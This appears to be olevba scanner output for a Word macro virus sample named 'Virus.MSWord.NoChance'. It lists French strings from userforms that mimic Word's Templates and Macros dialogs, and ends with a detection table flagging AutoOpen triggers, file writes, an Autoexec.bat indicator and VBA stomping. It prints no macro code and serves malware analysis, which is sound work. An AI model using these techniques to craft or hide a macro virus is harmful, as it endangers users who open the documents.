VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�le de document gS
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Mise � jour automatique des styles de document
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Mod�les globaux et compl�mentsB
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Les �l�ments coch�s sont d�j� en m�moire.ID
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Attacher....D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ajouter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Organiser...E
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Chemin d'acc�s:
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
H�,? 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tous les mod�les actifs
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Nom de la macro:0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Macros disponibles dans::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial Narrow
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Description:�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ex�cuter
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Annuler
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Ex�cuter pas � pas
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Modifier
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Cr�er
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Supprimer
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Organiser...
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Arial
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Frame1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'CheckBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm900'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ScrollBar1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Tous les mod\xe8les actifs'
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox2'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton2'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton3'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton4'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton5'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton6'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton7'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'ListBox1'" IN 'Virus.MSWord.NoChance' - OLE stream: 'Macros/UserForm999'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|AutoExec  |ScrollBar1_Change   |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

